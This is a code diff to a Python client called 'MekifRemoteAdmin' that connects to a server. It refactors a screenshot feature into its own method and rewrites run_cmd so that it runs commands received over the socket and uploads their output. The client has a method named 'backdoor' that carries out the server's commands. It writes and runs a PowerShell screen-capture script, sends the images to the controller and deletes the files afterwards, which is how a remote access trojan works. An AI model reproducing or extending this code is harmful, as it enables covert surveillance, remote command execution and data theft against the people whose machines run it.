@@ -29,9 +29,6 @@ class Client:
             os.makedirs(self.main_path)
 
     def connection(self):
-        # soc = socket.socket()
-        # soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
         while True:
             time.sleep(1)
             print(colored(f"[i]Connecting to Server: {self.server_host} | Port {self.server_port}...", 'cyan'))
@@ -63,6 +60,60 @@ class Client:
         except FileNotFoundError:
             print("Anydesk.exe was not found.")
             return
+
+    def screenshot(self):
+        self.d = datetime.now().replace(microsecond=0)
+        self.dt = str(self.d.strftime("%b %d %Y"))
+        self.fulldt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
+        self.filename = \
+            rf"c:\MekifRemoteAdmin\screenshot {self.hostname} {str(self.localIP)} {self.fulldt}.jpg"
+        self.chunk = 40960000
+        self.path = rf'c:\MekifRemoteAdmin\screenshot.ps1'
+        with open(self.path, 'w') as file:
+            file.write("Add-Type -AssemblyName System.Windows.Forms\n")
+            file.write("Add-Type -AssemblyName System.Drawing\n\n")
+            file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
+            file.write("$Width  = $Screen.Width\n")
+            file.write("$Height = $Screen.Height\n")
+            file.write("$Left = $Screen.Left\n")
+            file.write("$Top = $Screen.Top\n\n")
+            file.write("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n")
+            file.write("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n")
+            file.write("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n")
+            file.write(rf"$bitmap.Save('{self.filename}')")
+
+        time.sleep(0.2)
+
+        ps = subprocess.Popen(["powershell.exe", rf"{self.path}"], stdout=sys.stdout)
+        ps.communicate()
+        try:
+            # Send filename to server
+            soc.send(f"{self.filename}".encode())
+
+            # Receive filename Confirmation from the server
+            msg = soc.recv(self.chunk).decode()
+            print(f"@Server: {msg}")
+            length = os.path.getsize(self.filename)
+            print(f"SC Size: {length}")
+            soc.send(convert_to_bytes(length))
+
+            # Send file content
+            with open(self.filename, 'rb') as img_file:
+                img_data = img_file.read(1024)
+                while img_data:
+                    soc.send(img_data)
+                    if not img_data:
+                        break
+
+                    img_data = img_file.read(1024)
+
+        except ConnectionResetError:
+            return False
+
+        # Send Confirmation to server
+        soc.send(f"{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
+        os.remove(self.filename)
+        os.remove(self.path)
 
     def backdoor(self, soc):
         # Send Computer Name to Server
@@ -99,7 +150,7 @@ class Client:
 
                         elif str(command) == "cmd":
                             cmd = soc.recv(1024).decode()
-                            run_cmd(cmd)
+                            run_cmd(cmd, self.hostname, self.localIP, self.dt)
 
                         elif str(command) == "back":
                             msg = "back".encode()
@@ -120,58 +171,7 @@ class Client:
 
                 # Capture Screenshot
                 elif str(command.lower()[:6]) == "screen":
-                    self.d = datetime.now().replace(microsecond=0)
-                    self.dt = str(self.d.strftime("%b %d %Y"))
-                    self.fulldt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
-                    self.filename = \
-                        rf"c:\MekifRemoteAdmin\screenshot {self.hostname} {str(self.localIP)} {self.fulldt}.jpg"
-                    self.chunk = 40960000
-                    self.path = rf'c:\MekifRemoteAdmin\screenshot.ps1'
-                    with open(self.path, 'w') as file:
-                        file.write("Add-Type -AssemblyName System.Windows.Forms\n")
-                        file.write("Add-Type -AssemblyName System.Drawing\n\n")
-                        file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
-                        file.write("$Width  = $Screen.Width\n")
-                        file.write("$Height = $Screen.Height\n")
-                        file.write("$Left = $Screen.Left\n")
-                        file.write("$Top = $Screen.Top\n\n")
-                        file.write("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n")
-                        file.write("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n")
-                        file.write("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n")
-                        file.write(rf"$bitmap.Save('{self.filename}')")
-
-                    time.sleep(0.2)
-
-                    ps = subprocess.Popen(["powershell.exe", rf"{self.path}"], stdout=sys.stdout)
-                    ps.communicate()
-                    try:
-                        # Send filename to server
-                        soc.send(f"{self.filename}".encode())
-
-                        # Receive filename Confirmation from the server
-                        msg = soc.recv(self.chunk).decode()
-                        print(f"@Server: {msg}")
-                        length = os.path.getsize(self.filename)
-                        print(f"SC Size: {length}")
-                        soc.send(convert_to_bytes(length))
-
-                        # Send file content
-                        with open(self.filename, 'rb') as img_file:
-                            img_data = img_file.read(1024)
-                            while img_data:
-                                soc.send(img_data)
-                                if not img_data:
-                                    break
-
-                                img_data = img_file.read(1024)
-
-                        # Send Confirmation to server
-                        soc.send(f"{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
-                        os.remove(self.filename)
-                        os.remove(self.path)
-
-                    except ConnectionResetError:
-                        break
+                    self.screenshot()
 
                 # Get System Information & Users
                 elif str(command.lower()[:2]) == "si":
@@ -371,8 +371,35 @@ def bytes_to_number(b):
     return res
 
 
-def run_cmd(cmd):
-    return subprocess.run(cmd, capture_output=True)
+def run_cmd(cmd, hostname, localip, fulldt):
+    filename = rf"c:\MekifRemoteAdmin\cmd {hostname} {str(localip)} {fulldt}.txt"
+    with open(filename, 'w') as file:
+        p = subprocess.run(cmd, stdout=file)
+
+    soc.send(filename.encode())
+    msg = soc.recv(1024).decode()
+    print(msg)
+
+    length = os.path.getsize(filename)
+    print(f"PSFile Size: {length}")
+    soc.send(convert_to_bytes(length))
+
+    try:
+        with open(filename, 'rb') as cmd_file:
+            cmd_data = cmd_file.read(1024)
+            while cmd_data:
+                soc.send(cmd_data)
+                if not cmd_data:
+                    break
+
+                cmd_data = cmd_file.read(1024)
+
+        msg = soc.recv(1024).decode()
+        print(f"@Server: {msg}")
+        soc.send(f"{hostname} | {localip}: Powershell Command Completed.\n".encode())
+
+    except socket.error:
+        return False
 
 
 def check_file_path(pat, subpat=None, file=None):
